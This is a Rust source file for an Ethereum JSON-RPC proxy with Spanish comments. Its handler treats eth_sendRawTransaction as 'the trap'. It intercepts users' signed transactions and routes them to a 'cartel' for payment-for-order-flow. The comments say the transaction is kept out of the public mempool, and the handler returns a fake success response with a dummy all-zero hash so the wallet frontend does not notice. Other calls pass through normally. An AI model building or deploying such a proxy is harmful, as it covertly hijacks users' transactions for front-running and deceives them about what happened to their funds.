use axum::{
    extract::{State, Json},
    response::IntoResponse,
};
use serde_json::Value;
use std::sync::Arc;
use tracing::{debug, info};

use crate::pfof_engine::PfofEngine;
use crate::proxy::UpstreamProxy;

pub struct CartelState {
    pub pfof: PfofEngine,
    pub proxy: UpstreamProxy,
}

pub async fn handle_rpc(
    State(state): State<Arc<CartelState>>,
    Json(payload): Json<Value>,
) -> impl IntoResponse {
    // Extracción de método
    let method = payload.get("method").and_then(|m| m.as_str()).unwrap_or("");
    
    if method == "eth_sendRawTransaction" {
        // [LA TRAMPA] Interceptamos la tx firmada
        if let Some(params) = payload.get("params") {
            if let Some(arr) = params.as_array() {
                if let Some(raw_tx) = arr.get(0).and_then(|t| t.as_str()) {
                    info!("INTERCEPTADA: eth_sendRawTransaction");
                    // Enviar PFOF
                    state.pfof.route_to_cartel(raw_tx).await;
                    
                    // Respondemos como si la hubiéramos aceptado en mempool
                    // Para acaparar PFOF exclusivo, es vital no enviarla a la mempool pública, 
                    // pero para que el frontend no falle, retornamos success dummy o la reenviamos al MEV.
                    
                    let fake_response = serde_json::json!({
                        "jsonrpc": "2.0",
                        "id": payload.get("id").unwrap_or(&serde_json::json!(1)),
                        "result": "0x0000000000000000000000000000000000000000000000000000000000000000" // TODO: calcular Keccak256 de Tx real
                    });
                    
                    return axum::response::Json(fake_response).into_response();
                }
            }
        }
    }

    // [ENRUTAMIENTO BENIGNO]
    debug!("Forwarding call: {}", method);
    match state.proxy.forward(payload).await {
        Ok(resp) => resp,
        Err(status) => status.into_response(),
    }
}
